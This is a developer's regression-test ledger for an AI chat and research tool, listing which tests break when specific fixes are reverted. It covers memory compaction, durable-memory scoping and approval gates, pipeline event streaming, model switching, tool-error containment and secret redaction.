| Report a standing condition every step | `test_a_standing_condition_is_reported_once_per_run` | `compaction_blocked` / `compaction_failed` stay true until something changes. The control is `test_a_real_compaction_still_reports_every_time` — a compaction that happened is an event and must repeat |

### Three standing notes from this pass

**`tests/test_storage_e2e.py` is the only test running real `ConversationMemory`
against real `storage.py` on real SQLite.** Its fixture is module-scoped and that is
not a performance choice: declaring a SQLModel table registers it on
`SQLModel.metadata`, so importing `storage` twice against real sqlmodel raises "Table
'conversationthread' is already defined". Modules are popped and re-imported, never
reloaded, for the same reason. If you add a test there, do not give it its own swap.

**That file's regression test adds exactly ONE turn between compaction rounds.** Three
turns makes it pass against the broken code — the archive then grows faster than the
view-space floor shrinks and the watermark limps forward anyway. One turn is also the
production pattern: after a compaction the thread is still near the threshold, so the
next turn compacts again. Do not "tidy" that number.

**A guard that cannot fire through the normal path needs a direct test.** Once M11's
root fix is in, the watermark never goes backwards, so `save_checkpoint`'s refusal and
`compact()`'s no-progress skip are unreachable from `compact()`. They are tested by
calling them directly. A guard with no test making it fire is indistinguishable from a
guard that does not work — the first revert-check pass of this fix reported four
MISSes for exactly that reason.

## §21b — durable memory (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Ignore `project_path` when listing | `test_a_project_memory_is_invisible_from_another_project` | M12. D25 keys project memories to the resolved path; with only a `scope` string, AC6 is unwriteable as a test rather than merely unenforced |
| Stamp a global row with a project path | `test_a_global_memory_records_no_project_path` | It is then global in name and project-scoped in effect the moment anything filters on the column |
| Return everything when no project resolved | `test_no_resolved_project_means_no_memories_at_all` | `get_project_path()` is None exactly when `initialize()` has not run — "there is no session", not "this session is outside a project" |
| List oldest first | `test_memories_come_back_newest_first` | M14 keeps the most recent N, so the ordering decides which memories survive the cap |
| Make `forget_memory` raise on an unknown id | `test_forgetting_an_unknown_id_reports_rather_than_raises` | The id came from a human reading a list |
| Treat `agent=None` as opted OUT | `test_a_plain_chat_turn_counts_as_opted_in` | M13. `system_prompt_for` is unreachable without an agent, so the feature would be invisible in the default shell — the §25 shape |
| Drop the `use_memory` check at the assembly | `test_an_opted_out_agent_gets_no_fragment` | How the compactor and pipeline reviewer stay out of a user's durable facts |
| Remove M14's cap, or truncate silently | `test_the_cap_limits_how_many_reach_the_prompt`, `test_truncation_is_stated_in_the_prompt_the_model_reads` | Unbounded growth is what §21 exists to fight. The message goes to the MODEL, not only to a log — a log line reaches nobody mid-conversation |
| Announce truncation that did not happen | `test_nothing_is_said_about_truncation_when_none_happened` | The control. "Showing N of N" on every prompt is noise that trains the reader past the real one |
| **Append the fragment inside `with_catalogs()`** | `test_no_memory_reaches_a_research_pass_prompt` | **§19's K6, second instance.** That function feeds `pass_prompt()`, so every user memory would land in all ten research passes from a shell that wrote none of them |
| Stop appending in `run_agent_conversation` | `test_a_real_chat_turn_sends_the_memories` | The CALL SITE. A first version of that test exercised `with_memories` directly and stayed green through this revert — a helper existing proves nothing if nobody calls it |
| Append for an agent-built prompt too | `test_a_real_chat_turn_with_an_agent_prompt_does_not_double_up` | It already went through `system_prompt_for`; repeating pays twice for the tokens M14's cap bounds |
| Un-gate `remember`, or gate `pin` | `test_remember_requires_approval_and_pin_does_not` | D26 asserted as the PAIR it is — either half alone reads as arbitrary. Note `remember: bool = True` appears in BOTH permission dataclasses; reverting the wrong one proves nothing |
| Remove `remember` from `PIPELINE_UNGRANTABLE` | `test_remember_cannot_be_granted_to_a_research_run` | M17. No `approval_check` means R2 calls it grantable, so one `--grant remember` would let ten unattended passes write durable memories — what D26's consequence 1 forbids |
| Drop the content or the reach from the approval notice | `test_the_notice_shows_the_exact_content`, `test_the_notice_distinguishes_global_from_project_reach` | The gate is only worth having if the prompt shows what it is gating |
| Coerce an unknown scope to the default | `test_an_unknown_scope_is_refused_rather_than_coerced` | A model asking for "global" and getting a project row believes a preference follows the user everywhere when it does not |
| Write a project row with no resolved project | `test_a_project_memory_with_no_resolved_project_is_refused` | `list_memories` matches project rows on the path, so it could never be read back — invisible rather than wrong, which is worse |
| Give a piped run a provider | `test_a_piped_session_stays_headless`, `test_a_piped_chat_turn_carries_none` | M16. Matching `build_review_consent`: nobody is there to ask, so `remember` must not fire |
| Make chat use attended's `honour_run_scope=False` | `test_the_chat_provider_honours_run_scope` | Chat wants §18's per-run shortcut; attended research exists for per-call supervision. The two builders must not converge |
| Stop passing the authorization from `run_chat` | `test_a_chat_turn_carries_the_authorization` | Same call-site lesson as above, applied before it could repeat |
| Let `/forget` match a content substring | `test_forget_refuses_a_substring_rather_than_guessing` | A substring hitting two memories has to pick one, and picking silently deletes what the user did not name |
| Drop `/forget`'s empty-argument check | `test_forget_with_no_argument_explains_itself` | Asserted on "Usage:" and NOT on "/memories", which both branches mention — the first version of this row stayed green through the revert for exactly that reason |

### Two standing notes

**Prompt assembly now reads storage.** Any test that initializes `config_loader` AND
builds an agent or chat prompt needs the `fake_storage` fixture — five existing tests
gained it here. A test that does *not* initialize the loader is unaffected, because
`get_project_path()` returns None and the manager answers with nothing.

**`test_compaction_e2e.py` is now `tests/test_storage_e2e.py`** and is the home for
every real-`storage.py` test, not just compaction's. The one-swap rule in the §21a
notes above still applies and is the reason it is one file.

## §22 — pipeline observability (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Stop advancing `_Progress._emitted` | `test_the_watermark_only_moves_forward` **and every other test in the file hangs** | The `while` loop never terminates, so the generator yields the same line forever. A hang, not a failure — kill the run rather than waiting for the timeout |
| Persist AFTER emitting in `checkpoint()` | `test_abandoning_the_generator_leaves_the_record_running` | A generator only advances while someone iterates it, so a consumer that abandons the run between the yield and the persist takes that checkpoint down with it. §5's durability must not depend on a UI's willingness to keep reading |
| Have the orchestrator emit events beside each existing checkpoint instead of deriving them | `test_a_line_written_the_way_review_py_writes_one_is_carried` | AC3. `run.trace` has three writers — `orchestrator.py`, `review.py` (fifteen `run.log()` calls, no checkpoints) and `json_retry.py`'s bare `trace.append()`. Deriving from the list is what carries the other two without editing them |
| Emit a `trace_line` per call site rather than per un-emitted line | `test_every_trace_line_is_emitted_exactly_once_and_in_order` | A re-emitted line is a duplicate in the transcript; a skipped one reached the database and never reached the user |
| Return the run any way other than the terminal event | `test_the_generator_and_the_wrapper_produce_the_same_run` | The wrapper would still work and a streaming consumer would silently get nothing |
| ~~Make `run_deep_research_pipeline` the generator~~ **(row retired, batch 45)** | — | P3 is retired: both shells left for the generator, so the wrapper had no production caller and its fifty call sites were all tests. The convenience is `tests/conftest.run_pipeline` now, and AC1 is pinned on `run_pipeline_to_completion` by `test_draining_the_generator_returns_a_finished_run` |
| Add an eighth field to `LoopEvent` (it has seven) | `test_loop_event_did_not_grow_an_eighth_field` | P1/AC4. §23's events are a decision to make, not a field to add quietly |
| Drop `on_pipeline_event_message`, or stop forwarding in `_forwarding` | `test_ac2_the_tui_renders_pass_boundaries_and_tiers_as_they_happen` | AC2. The panel and transcript are fed exclusively by events — nothing else could have produced a tier for a claim the canned run never had |
| Re-add the `run.trace` dump to `on_research_finished` (or the CLI's `--- Trace ---` block) | `test_the_finished_run_does_not_reprint_the_trace` | Every line already arrived as an event; both prints the whole run twice, and the second copy reads like a different artifact |
| Count `claim_tiered` events instead of keying by claim id | `test_a_re_tiered_claim_is_not_counted_twice` | 6c re-tiers the same claim once per retry round, so the tally would exceed the claim count and keep climbing |
| Name the widget's redraw helper `_render` | **every `test_tui.py` pilot test**, with `'NoneType' object has no attribute 'get_height'` | It shadows Textual's `Widget._render()`, and the traceback points at the compositor rather than at the widget |

### Standing: two ways a research double stops working

**A patch on `run_deep_research_pipeline` no longer intercepts either shell.** Both
`main.run_research` and `tui.app._start_research` call
`stream_deep_research_pipeline`, so the old target is a silent no-op that lets the
REAL pipeline run. Loud here (the fake SDK has no `.stream`), but it is the
`fetch_url` class of defect: wired, documented, doing nothing. Every research double
goes through `_stub_events` (`test_tui.py`, `test_review.py`) or `_events_for`
(`test_e2e.py`).

**A plain-function double for a generator is NOT an error.** `_run_pass`,
`_run_pass_with_json_retry` and `_review_stage` are reached through `yield from`, so a
double returning `"REPORT"` makes it iterate the string one character at a time and
return `None` — the symptom is a report of `None` several asserts later. Use
`test_review.py`'s `_as_generator`, and `conftest.drain()` for a direct call that wants
the return value.

## `/model` — switching provider and model mid-session (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Drop the `_busy` guard | `test_model_is_refused_mid_turn` | Swapping under a running worker leaves the transcript claiming one model while the thread records another. Same guard `/new`, `/research` and the thread picker use |
| Stop upper-casing the provider argument | `test_model_switches_both_when_given_a_provider` | `providers.json` keys are upper-case, so `/model openai gpt-4o` would be rejected as unknown |
| Skip the effort re-validation after a switch | `test_switching_model_revalidates_the_effort_level` | Effort is per-MODEL. A level the old model accepted can be rejected outright by the new one, and every later turn fails with a provider 400 — the exact failure the mount-time check exists to stop, reachable again through a switch |
| List providers with no `API_KEY` as configured | `test_bare_model_reports_without_changing_anything` | It sends the user at a provider whose every call 401s |
| Refuse instead of warn on an empty `API_KEY` | `test_a_provider_with_no_key_warns_but_still_switches` | An OpenAI-compatible endpoint running locally legitimately needs no key; refusing blocks a real configuration |
| Accept an unknown provider name | `test_an_unknown_provider_changes_nothing` | `api_initialization` raises the same `ValueError` on the next turn, a long way from the typo that caused it |
| Set the attributes without `refresh_status()` | `test_the_header_shows_which_model_the_next_turn_uses` | The mount banner scrolls away, so nothing on screen says what the next turn will call |
| Read `app.model` anywhere other than at turn start | `test_the_new_model_reaches_the_next_model_call` | Asserted on `call_model_stream`'s arguments — setting the attribute proves only that the attribute was set |

## Tool-failure containment, the arXiv endpoint, and TUI logging (2026-08-05)

Found by running a real research pipeline: `arxiv_search` failed a finished
ten-pass run, and every warning it logged scribbled over the Textual screen.

| Change | What breaks | Fix / why |
|---|---|---|
| Revert `arxiv.ARXIV_API_URL` to `http://` | `test_the_endpoint_is_https` | arXiv 301-redirects it. httpx does NOT follow redirects by default, `raise_for_status()` only raises on >= 400, and the redirect body is empty — so `ET.fromstring("")` raises `ParseError`, three identical retries run, and the tool reports "failed after 3 attempts" for what is actually a scheme change |
| Drop `follow_redirects=True` from `_call_arxiv_api` | `test_redirects_are_followed` | Belt and braces beside https://. If arXiv moves the endpoint again this keeps working rather than failing as an unparseable empty body |
| Make `arxiv`/`web_search` raise after retries again | `test_arxiv_returns_an_error_after_exhausting_retries`, `test_web_search_returns_an_error_after_exhausting_retries` | One transient network failure inside one pass flipped a finished ten-pass run to `status='failed'`. `fetch_url` always returned an error dict; these two were the outliers |
| Remove `dispatch()`'s try/except around `spec.handler` | `test_an_exception_becomes_an_error_result`, `test_a_pipeline_pass_sees_an_error_result_not_an_exception` | The backstop for every future tool and every MCP server — third-party code that can raise anything |
| Catch `ToolCallDenied` in that block | `test_a_policy_denial_still_raises` | A policy denial is the caller's to handle and must stay distinguishable from a tool crash. Every raise of it is above the handler, so a correct implementation never reaches the except at all |
| Downgrade `logger.exception` to `warning` there | `test_the_traceback_is_logged_so_a_real_bug_stays_findable` | The traceback is how a genuine handler bug stays findable now that it no longer crashes the process |
| Route the error result around `check_output_policy` | `test_the_error_result_goes_through_secret_redaction` | An exception message carries the request that produced it — for an HTTP client, a URL with an API key in the query string. Redacting only the success path makes a FAILING tool the way secrets escape |
| Attach the stderr handler in the TUI | `test_stderr_false_attaches_no_stream_handler`, `test_reconfiguring_without_stderr_removes_the_existing_one` | Textual owns the terminal; stderr paints over the rendered screen, sits over the input bar and behind the panels, and vanishes at the next repaint |
| Default `configure_logging(stderr=...)` to False | `test_stderr_defaults_to_on` | The CLI is unchanged. A flipped default silences every non-TUI run |
| Drop `TranscriptLogHandler`, or its `on_unmount` removal | `test_a_warning_reaches_the_transcript`, `test_the_handler_is_detached_when_the_app_unmounts` | Without the handler, dropping stderr makes warnings invisible until someone reads `logs/app.log`. Without the removal it holds a reference to a dead app and stacks one handler per instance across this suite |
| Let `TranscriptLogHandler.emit` raise | `test_a_handler_failure_cannot_take_the_app_down` | emit() runs on whichever thread logged — a research worker, the MCP bridge. A handler that throws inside a message pump kills the app over a diagnostic |
| Route INFO to the transcript too | `test_info_is_not_routed_to_the_transcript` | Noise in a chat transcript; the rotating file already has it with timestamps |
| Warn per call in `context_limit()` | `test_the_unknown_model_warning_is_said_once_per_model` | `thresholds()` is called on every evaluation and `_maybe_compact` runs at the top of every step, so an unknown model warned twice a step across ten passes |
| Dedupe on a single boolean instead of the model | `test_a_second_unknown_model_is_still_reported` | A run that switches model, or a pipeline whose critic model differs (§11), must still hear about the second one |
| Look the model up without normalizing it | `test_a_dated_model_id_resolves_to_its_table_entry` | Exact matching sent `claude-sonnet-5-20260724` to the 200k default while `claude-sonnet-5` sat in the table at a million — a 5x undershoot that reaches `summarize_thread()`'s truncation gate |
| Re-key a `MODEL_CONTEXT_WINDOWS` entry with a date or a `vendor/` prefix | `test_every_table_key_is_already_normalized` | Lookup normalizes the incoming id first, so a decorated key can never be matched. This is what `claude-haiku-4-5-20251001` became the moment normalization existed |
| Split on the first dot instead of an allowlist in `_normalized` | `test_normalization_strips_decorations_and_nothing_else` | `gpt-5.1` and `qwen3.8-max-preview` carry dots inside the model name; a general rule corrupts the two entries it was meant to protect |
| Prefer the table over a queried window | `test_a_queried_window_wins_over_the_table` | The provider's answer is what THIS account has; the table can only record what a model can have |
| Drop the backstop's margin subtraction | `test_the_backstop_fires_at_the_window_minus_the_margin` | Nothing asserted the boundary — the pass-only test probes a full margin ABOVE it, so removing the subtraction entirely stayed green |
| Cache a context-window query that raised | `test_a_failed_query_is_warned_and_NOT_cached` | #35's rule, second application: one transient error would permanently suppress the query for the life of the process |
| Cache nothing when a provider legitimately reports no window | `test_a_provider_that_reports_nothing_answers_None_authoritatively` | That is an ANSWER, not a failure. Re-asking spends a request per compaction check per step |
| Read the Anthropic window with its own `models.retrieve` | `test_the_anthropic_window_rides_along_on_the_effort_retrieve` | It is on the ModelInfo the effort query already fetches; a second call makes config.py's "no extra call" claim false |
| Read only declared fields instead of `.model_extra` | `test_one_reader_covers_every_v1_compatible_spelling`, `test_openai_models_keep_unknown_provider_fields` | `openai.types.Model` declares none of the four aliases. Without the extra-field read, Groq/Mistral/Together/OpenRouter all fall silently back to the table |
| Give `_FakeAnthropicClient` no `.models`, as it had | `test_a_client_with_no_models_endpoint_fails_loudly_not_silently` | The #35 shape: the query raises AttributeError, its own `except` swallows it, and the suite stays green over a query that cannot succeed |
| Let a session override apply to a model it was not set for | `test_another_model_or_provider_does_not_see_it` | The window feeds `_input_budget()`, which gates `summarize_thread()`'s truncation — a 1M number reaching a 200k critic model discards thread content |
| Clear a session override on a pair MISMATCH | `test_a_mismatched_read_does_not_clear_the_override` | One routine critic pass mid-research would silently destroy an override set for the chat, with nothing naming which command did it |
| Rely on the (provider, model) binding instead of clearing on `/model` | `test_switching_away_and_back_gives_the_default_not_the_old_value` | The value stays stored against the original pair, so switching back restores it — the opposite of what was asked for. Both rules are needed and neither is redundant |
| Read the configured trigger in `pin_measurements` | `test_the_pin_cap_follows_a_LOWERED_session_trigger` | `/trigger 12k` leaves the cap at 20k, so one pin can protect more than the whole trigger and floor the thread permanently above it — #89 reintroduced through a different command |
| Let the session tier beat an explicit `/compact` override | `test_an_explicit_compact_override_still_wins` | D27's chain is nearest-wins, and a caller passing its own value is nearer than session state |
| Drop `/trigger`'s eager validation | `test_a_trigger_below_its_dependent_floors_is_REFUSED` | The `ValueError` surfaces later inside `should_compact()` — hot path, mid-turn, far from the command that caused it |
| Refuse a `/window` above the reported window | `test_window_warns_but_does_not_refuse_above_the_reported_window` | Raising it is the command's best use: a beta-gated 1M window reads as 200k until the account is asked with the right header |
| Add `context_window` to `_KNOWN_COMPACTION` | `test_nothing_reaches_the_settings_schema` | A settings key makes it persistable, so a cloned project could ship one behind a trust prompt — the shape G7 and R12 both rejected |
| Loosen `mcp==2.0.0` back to a range | `test_ac6_is_error_becomes_the_error_convention_without_raising` (the batch-32 CI break) | A minor bump changed server behaviour underneath the range: 2.1.0 withholds a crashed tool's text. CI then depended on when it ran, and was not testing what anyone runs locally |
| Assert a CRASHED tool's own message reaches the client | `test_ac6_is_error_becomes_the_error_convention_without_raising` | That is the SERVER's policy, not this client's contract, and in production the server is someone else's. AC6 claims the failure does not RAISE |
| Make the deliberate-failure probe raise a bare exception | `test_ac6_a_deliberate_tool_failure_carries_its_message` | Only `ToolError` has its message forwarded on both pinned versions; a bare exception is a crash and 2.1.0 withholds its text, so the assertion would pass on one version and fail on the other |

### Standing: `compaction._context_window_warned` is module state

`tests/test_compaction.py` clears it in an autouse fixture. Without that, whether
`test_an_unknown_model_warns_about_its_assumed_window` passes depends on which
tests ran first — the kind of order dependency that reads as a flake.


## The truncated-pass cascade and the research budget (2026-08-05)

From a live run: Pass 1 made 14 tool calls, crossed the 250k chat budget, and
returned a tool-calling response with empty text. The orchestrator stored `""`
as `raw_response`; Pass 2 correctly reported it had nothing to extract; the run
died in `Claim`'s constructor three passes later.

| Change | What breaks | Fix / why |
|---|---|---|
| Drop `_check_not_truncated` from `_run_pass` | `test_an_empty_truncated_pass_raises_naming_the_stop_reason`, `test_max_steps_is_treated_the_same_way`, `test_whitespace_only_text_counts_as_empty` | A stop condition returns the last response as it stands, so a pass cut off mid-tool-call yields `""` and every later pass works from nothing |
| Make truncation always fatal | `test_a_truncated_pass_WITH_text_continues_and_is_traced` | A pass that produced an answer and was cut off finishing it is degraded but usable; failing there throws away work the later passes can use |
| Make truncation never fatal | `test_an_empty_truncated_pass_raises_naming_the_stop_reason` | The empty case is exactly the cascade this exists to stop |
| Check `if not response.text` instead of `.strip()` | `test_whitespace_only_text_counts_as_empty` | `"
  "` gives the next pass nothing |
| Treat a missing `stop_reason` as truncated | `test_a_response_with_no_stop_reason_is_not_treated_as_truncated` | `stop_reason` is set by `_run()`/the wrappers, never by `call_model()`. Absence is not evidence of truncation |
| Run the check AFTER `retry_until_json` | `test_a_truncated_json_pass_raises_rather_than_retrying` | A cut-off pass did not write malformed JSON. Nudging it spends more of an exhausted budget to be told the same thing, and reports a parse failure for output that was never finished |
| Revert `run_deep_research_mode` to `MAX_TOKEN_BUDGET` | `test_a_pass_runs_on_the_research_budget_not_the_chat_one` | The meter re-counts the whole prompt every step (TECHNICAL_DEBT item 9), so a tool-heavy pass burns the chat ceiling quadratically |
| Drop `max_total_tokens` from the orchestrator's `retry_until_json` call | `test_the_json_retry_carries_the_same_budget` | The retry re-enters the pass's already-large thread; the chat default would cut it off almost immediately. Same argument as the `context` parameter beside it |
| Raise `MAX_TOKEN_BUDGET` instead of adding a second constant | `test_chat_keeps_the_smaller_budget` | Raising the research ceiling must not raise the chat spend cap with it |

### Standing: `extra={}` in a log call renders as nothing

The default formatter is `%(message)s`, so `logger.warning("fetch_url failed",
extra={"url": ..., "error": ...})` prints exactly `fetch_url failed`. Every
diagnostic field is dropped. Interpolate into the message instead. This is why a
run of ordinary 404s was indistinguishable from a broken tool, and why an arXiv
scheme change hid behind three identical `arxiv_search attempt failed` lines.


## §26 — research legibility (2026-08-05)

### The one that fails by passing: doubles on `run_deep_research_mode`

`_run_pass` now iterates `RunAgentLoop.stream_deep_research_mode()`. Anything
still patched on `run_deep_research_mode` **stops intercepting and runs the real
loop** — 46 failures across 8 files, none of them at the patch site. This is
§22's twelve-doubles trap one layer down, and it is now the second recorded
instance, so treat any repoint of a call site as a repoint of its doubles.

Repointing goes through `tests/conftest.py`'s `pass_stream(source, events=())`,
which turns a double written against the old name into a generator side_effect.
Do not open-code it — fifteen bespoke wrappers is how they drift.

| Change | What breaks | Fix / why |
|---|---|---|
| `_translate` uses `for event in stream` instead of `next()` | `test_the_response_still_carries_its_thread_id` | A `for` loop SWALLOWS a generator's return value, and `thread_id` is attached after the pass's loop finishes. Every test about tool events still passes; §3's JSON retry silently opens a new thread instead of correcting the failed one |
| ~~`run_deep_research_mode` returns the generator instead of draining it~~ **(row retired, batch 45)** | — | The wrapper is gone; `_run_pass` iterates `stream_deep_research_mode` and the only remaining callers were tests. `tests/conftest.run_pass` is the synchronous form |
| `run_to_completion` used to drain a PASS | `test_draining_a_pass_returns_the_response_with_its_thread_id` | Unchanged in substance, and the subject moved with the wrapper: `run_to_completion` reads the response off the terminal event, which is the copy WITHOUT `thread_id`. A pass must be drained by something that keeps a generator's return value — `yield from` in `_run_pass`, `tests/conftest.drain` in a test. `core.loop.return_value_of` was that helper and retired with the wrapper it served |
| Drop `redact_secrets` from `_param_digest` | `TestTheParamDigestIsRedacted` (2 tests) | Tool ARGUMENTS were never redacted: `check_input_policy` refuses a call, it does not redact one, and `check_output_policy` only saw results |
| Redact after truncating instead of before | `test_redaction_runs_before_truncation` | Truncation can cut a credential below the 20 characters its pattern needs, leaving the fragment unmatched. The test fixture puts the cut inside the key on purpose — with a longer surviving fragment it passes either way |
| Emit `_stage("D2")` inside the per-claim loop | `test_d2_is_announced_once_per_round_not_once_per_claim` | D2 is one decision applied to every exhausted claim; per-claim emission makes a round that exhausted six claims read as six stages. The fixture exhausts TWO claims — with one, the two behaviours are indistinguishable |
| Add a `step` kind and infer it from the event stream | — (no test; it is an absence) | `_run()` has no step marker. Within a step it yields start/result in pairs; between steps it yields nothing unless the model streamed text. See the note in `core/reasoning/events.py` |
| Forward `token_delta` text into `PipelineEvent.text` | `test_streamed_text_becomes_volume_never_content` | Seven of the ten passes emit raw JSON; only the volume escapes |
| Give `LoopEvent` an eighth field for any of this | `test_pipeline_events.py`'s P1 pin | `PipelineEvent` is the type that grows. That is what its `kind` discriminator is for |

### The TUI half

| Change | What breaks | Fix / why |
|---|---|---|
| `Transcript._styles` calls `self.app` unguarded | `test_a_widget_renders_without_a_running_app` | `self.app` raises `NoActiveAppError` rather than returning None, and widgets are constructed bare throughout the suite. Presentation degrades; it does not raise |
| Bind the claims view to `ctrl+k` | `test_ctrl_l_opens_the_claims_view_while_the_input_has_focus` | Textual's `Input` binds `ctrl+k` to `delete_right_all` and holds focus, so the binding is shadowed and pressing it deletes the typed line |
| `/theme` stops calling `rerender()` | `test_switching_theme_replays_the_transcript` | `RichLog` stores rendered segments, so everything already on screen keeps the old palette. Note the test spies on the RENDER: `_entries` survive either way, so an assertion about them alone passes with the replay removed |
| A new write path that skips `Transcript._emit` | — (silent) | The line reaches the screen and neither the `/theme` replay nor `/copy all`. Same two-writers shape §22 removed from the trace |
| `--file` also fires `copy_to_clipboard` | `test_copy_to_a_file_writes_what_it_says_it_wrote` | `--file` exists because OSC 52 cannot be confirmed; doing both makes the provable route indistinguishable from the unprovable one |

### Standing: a transcript stub must track `Transcript`'s write methods

`_StubTranscript` (`test_agents.py`), `_NullTranscript` (`test_review.py`) and
`_T` (`test_skills.py`) each stand in for the real widget. When `tui/app.py`
starts calling a new one, all three need it — the failure is an `AttributeError`
raised from inside `app.py`, nowhere near the widget that grew the method. §26
added `write_answer`, `write_role`, `rerender` and `as_text`, and made
`flush_stream` return the flushed text rather than None.

---

## 12. ROADMAP_v2 §27 — thread kinds, and the doubles that construct a memory

§27 gave `ConversationMemory.__init__` a second parameter (`kind`) and
`storage.create_thread` / `storage.list_threads` a keyword each. Nothing in
production calls them positionally, so the breakage is entirely in doubles —
and it does not fail at the double, it fails inside `core/loop.py` with a
`TypeError` about an unexpected keyword argument.

| Change | What breaks | Fix / why |
|---|---|---|
| A `ConversationMemory` double that does not accept `kind` | `TypeError: __init__() got an unexpected keyword argument 'kind'` raised from `core/loop.py`, in whichever test installed the double | `tests/conftest.py`'s `FakeMemory` and `test_cli.py`'s two `SpyMemory` classes take `(thread_id=None, kind="chat")` and RECORD the kind. Any new double does the same |
| A `FakeStorage` that does not mirror `create_thread(kind=...)` / `list_threads(kind=...)` | `TypeError` at the call, or a filter test that passes for the wrong reason | `FakeStorage` mirrors both, plus `thread_kind()` — which is NOT a production method, deliberately named differently, and exists only as §27 AC1's assertion hook |
| Remove `list_threads`' default filter, or its `kind`/`preview` row fields | `test_list_threads_returns_all_threads_most_recent_first` (shape), `test_machinery_threads_are_not_listed`, `test_list_threads_filters_by_kind_in_sql` | The row shape is asserted exactly, in the fake and against real SQL. `kind=None` is the escape hatch and must keep returning everything |
| `create_thread` stops defaulting to `chat` | Broadly red: every existing caller creates conversations by omission | The default is what keeps §27 a two-line change at three call sites instead of an audit of every thread creation |
| Replay reads `memory.messages` instead of `storage.archive_history` | `test_replaying_a_compacted_thread_shows_the_original_first_message` | T3. The derived view leads with the compaction summary, which M8 says must never be rendered as something the user said. Note the test needs a REAL compaction — the two spaces coincide until a checkpoint exists, which is how §21a's watermark defect survived 849 tests |
| Replay renders tool RESULTS | `test_a_tool_call_is_one_line_and_its_result_is_skipped` | T4. A grounding-heavy thread carries hundreds of kilobytes of fetched page text in those rows |
| A second copy of `param_digest` | `TestTheParamDigestIsRedacted` still passes — against whichever copy the test imports | §27 moved it to `safety/policy_enforcement.py` because the replay renderer is its second caller. The tests moved WITH it, so there is one place the redact-before-truncate ordering is pinned. A copy is invisible to them |
| Record a pass's thread AFTER `_check_not_truncated` | `test_a_pass_that_dies_truncated_still_records_its_thread` | That check RAISES for a pass cut off mid-tool-call, whose thread is the one most worth opening |
| Relax `classify_legacy_pass_threads`' window to include an unfinished run | 3 tests in `TestClassifyingLegacyThreads` | Both guards have to go for it to break: SQL's `x <= NULL` is already not true, so dropping either alone changes nothing. The lenient version (`finished_at IS NULL OR ...`) reads as a kindness and hides every conversation since an abandoned run |
| `ensure_columns` grows a backfill so the separate classification can go away | — (silent, then destructive) | M7's contract is additive-only. The classification is a separate function precisely so data policy stays out of the one function every launch runs through |

### Standing: `app._transcript` is a query against the ACTIVE screen

A pilot test that opens a modal (`ThreadPickerScreen`, `PermissionScreen`, …)
and then reads `app._transcript` gets `NoMatches`, because the query runs
against the pushed screen. Hold a reference to the widget BEFORE opening the
modal — `test_resuming_clears_the_screen_and_replays` does, and the comment
there says why.

---

## 13. ROADMAP_v2 §21c — the summary store, and the tier every shell owes

§21c added `storage.ThreadSummary` plus three functions, and a prompt tier that two
shells must both apply. Nothing here fails at the edit site.

| Change | What breaks | Fix / why |
|---|---|---|
| A `FakeStorage` without `latest_thread_summary` / `save_thread_summary` | `AttributeError` from inside `core/compaction.py`, in whichever test drove a summary | Both are mirrored in `_thread_summaries`, a dict kept SEPARATE from `_checkpoints` for the same reason production uses a separate table. `last_message_id` and `advances` are deliberately NOT mirrored — both read `_ordered_rows`, which is faked, so the real position arithmetic runs under test |
| Route a summary through `save_checkpoint` (or add an advance guard to `save_thread_summary`) | `test_a_thread_summary_does_not_compact_the_thread` (real SQL), `test_summarizing_does_not_change_what_the_model_sees` | M18. `latest_checkpoint` resolves by timestamp and feeds `_derived_view`, so a summary row there becomes the live watermark and folds the thread it describes. The missing guard is a decision, not an omission |
| `summarize_thread` reads `memory.messages` | `test_it_reads_the_archive_not_the_derived_view`, and the real-storage `test_a_summary_of_a_compacted_thread_describes_the_conversation` | T3's reasoning. Note the real-storage test needs a thread whose DERIVED VIEW alone exceeds `SUMMARY_TARGET_CHARS` — otherwise the view-based version stores verbatim, makes no call, and the assertions read the compaction's call instead. That is how it was wrong the first time |
| Make the summary target a `COMPACTION_TARGET_RATIOS` entry | `test_the_target_is_absolute_not_a_strength_ratio` | The consumer is a prompt tier on every turn, so nothing bounds a proportional target. The test asserts the two candidate numbers DIFFER before asserting which was used — without that it passes either way |
| Remove the fits-already branch | `test_a_short_thread_costs_no_model_call` | A thread shorter than the budget is its own best summary |
| Drop the `advances()` staleness check, either direction | `test_an_unchanged_thread_is_served_from_the_store` or `test_a_grown_thread_is_re_summarized` | Both directions matter: serving stale, and paying twice for an unchanged thread |
| Append `with_refs` inside `with_catalogs()` | `test_no_ref_reaches_a_research_pass_prompt` | K6's THIRD instance (skills, then §21b's memories). A conversation referenced in a chat session must not reach ten research passes |
| Guard `with_refs` with `if system_prompt is None`, copying the memories line above it | `test_an_agent_built_prompt_still_gets_them` | Refs are thread state, and `system_prompt_for()` has no memory object — so an active agent would silently lose every attached reference. A two-word edit that reads as consistency |
| Remove either `with_refs` call site | `test_a_real_chat_turn_sends_the_refs` or `test_the_tui_turn_sends_them_too` | Tested independently, because §21b recorded that testing only the helper leaves everything green when a call site goes |
| Make the ref cap drop the oldest | `test_the_cap_refuses_rather_than_dropping_the_oldest` | A reference is something a person chose by name; M15's rule against silent removal |
| Stop stating the cap in the fragment | `test_the_cap_is_applied_and_stated` | M14's no-silent-caps rule: the count reaches the MODEL, not only a log |
| `/summary` calls `compact()` | `test_it_shows_the_summary_without_folding_the_thread` | M20. Same summariser, different request |
| Remove the picker's `thread_id is None` guard | `test_a_dismissed_picker_does_nothing_at_all` | NOTE: an earlier version of this test asserted only "nothing was attached" and passed with the guard gone — summarising a None thread fails downstream, so refs stayed empty while the user got told "Could not summarise thread None". The assertion is on the whole outcome: no work, no output, `_busy` released |

### Standing: a shell that applies `with_goal` owes the same site a `with_refs`

Both are thread state read off `memory.extra`, and both are appended by the shells
rather than by the assembly point they share (K6). A new shell — or a new turn path in
an existing one — that applies one and not the other produces a reference that silently
does nothing on that path. The same standing note covers `with_memories`, with the
caveat that memories are conditional on there being no agent-built prompt and refs are
not.

## §14 — `/init` and the project documentation set (ROADMAP_v2 §24, `test_project_init.py`)

| Change | Breaks | Why |
|---|---|---|
| Write with `open()` instead of `registry.dispatch` | `test_the_write_goes_through_the_registry` | AC3/I1. Dispatch is what applies the approval gate, `check_input_policy` and output redaction |
| Give `write_project_doc` a `path` parameter | `TestTheScopedTools` | I1. "Cannot be aimed elsewhere" is structural because there is no path to supply — validating one instead is a weaker claim |
| Drop the document-name allowlist | `TestTheScopedTools` | The allowlist IS the confinement once the path is gone |
